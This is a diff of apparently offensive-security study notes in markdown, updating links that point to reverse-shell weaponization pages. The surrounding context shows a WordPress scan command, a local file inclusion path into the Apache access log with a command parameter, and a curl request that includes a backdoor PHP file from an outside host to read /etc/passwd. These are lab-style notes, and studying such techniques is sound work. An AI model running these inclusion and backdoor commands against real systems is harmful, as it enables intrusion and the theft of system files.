@@ -600,7 +600,7 @@ wpprobe scan -f targets.txt -t 20 -o results.json
 ```
 
 👉 If login success:
-→ [WordPress_PHP](../09_weaponization/Generate_ReverseShell/WordPress_PHP.md) 
+→ [WordPress_PHP](../10_weaponization/Generate_ReverseShell/WordPress_PHP.md) 
 ### Joomla 
 
 [4_joomscan](../tools/web_scan/cms/4_joomscan.md)
@@ -684,7 +684,7 @@ curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/ap
 ```bash
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
 ```
-If vulnerable → [ReverseShell](../09_weaponization/ReverseShell.md)
+If vulnerable → [ReverseShell](../10_weaponization/ReverseShell.md)
 
 ```zsh
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
